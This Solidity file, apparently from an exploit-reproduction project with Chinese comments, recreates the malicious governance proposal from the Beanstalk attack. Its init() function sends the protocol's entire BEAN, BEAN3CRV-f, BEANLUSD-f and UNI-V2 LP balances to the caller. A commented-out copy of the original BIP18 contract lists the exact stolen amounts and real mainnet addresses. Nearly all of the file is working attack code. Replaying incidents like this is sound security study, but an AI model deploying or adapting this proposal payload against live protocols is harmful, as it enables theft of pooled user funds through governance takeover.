// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "hardhat/console.sol";
import {IERC20} from "../interfaces/IERC20.sol";

contract ExploitBIP {
    // 这个提案的目的看黑客的利用,就是将获得了36,084,584 BEAN，0.5407 UNI-V2，874,663,982 BEAN3CRV-f以及60,562,844 BEANLUSD-f 发送个exp合约

    // address BEAN = address(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
    // address BEANCRV_F = address(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
    // address BEANLUSD_F = address(0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D);
    // address UNI_V2_BEAN_LP = address(0x87898263B6C5BABe34b4ec53F22d98430b91e371);

    IERC20 private constant beans = IERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
    IERC20 private constant beans3Crv = IERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
    IERC20 private constant beansLusd = IERC20(0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D);
    IERC20 private constant beansWethPair = IERC20(0x87898263B6C5BABe34b4ec53F22d98430b91e371);
    
    address private constant beansProtocol = 0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5;
    

    // 这里的Init()存在的意义是0x259a2795624B8a17bC7EB312a94504Ad0F615D1E 18号提案有这个函数
    function init() external {
        console.log("[11/xxx]EXPLOXT BIP emergencyCommit !");
        //这里就将钱转移给exp合约
        uint beansBalance =  beans.balanceOf(beansProtocol);
        if(beansBalance > 0) {
            beans.transfer(msg.sender, beansBalance);
        }

        uint beans3CrvBalance = beans3Crv.balanceOf(beansProtocol);
        if(beans3CrvBalance > 0) {
            beans3Crv.transfer(msg.sender, beans3CrvBalance);
        }

        uint beansLusdBalance = beansLusd.balanceOf(beansProtocol);
        if(beansLusdBalance > 0) {
            beansLusd.transfer(msg.sender, beansLusdBalance);
        }

        uint beansWethLpBalance = beansWethPair.balanceOf(beansProtocol);
        if(beansWethLpBalance > 0) {
            beansWethPair.transfer(msg.sender, beansWethLpBalance);
        }
        console.log("[12/xxx] send  BEAN  UNI-V2   BEAN3CRV-f  BEANLUSD-f");
    }
}



// 老外的
// contract BIP18  {
//     address constant BEAN = address(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
//     address constant BEANCRV_F =
//         address(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
//     address constant BEANLUSD_F =
//         address(0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D);
//     address constant PROPOSER =
//         address(0x1c5dCdd006EA78a7E4783f9e6021C32935a10fb4);
//     address constant UNI_V2_BEAN_LP =
//         address(0x87898263B6C5BABe34b4ec53F22d98430b91e371);
//     address immutable EXPLOIT_CONTRACT;

//     constructor(address _exploitAddr) {
//         EXPLOIT_CONTRACT = _exploitAddr;
//     }


//     function init() external {
//         console.log("EXPLOIT CONTRACT", EXPLOIT_CONTRACT);
//         IERC20(BEAN).transfer(EXPLOIT_CONTRACT, 36084584376516);
//         IERC20(UNI_V2_BEAN_LP).transfer(EXPLOIT_CONTRACT, 540716100968756904);
//         IERC20(BEANCRV_F).transfer(
//             EXPLOIT_CONTRACT,
//             874663982237419391168556425
//         );
//         IERC20(BEANLUSD_F).transfer(
//             EXPLOIT_CONTRACT,
//             60562844064129085666723423
//         );
//     }
// }
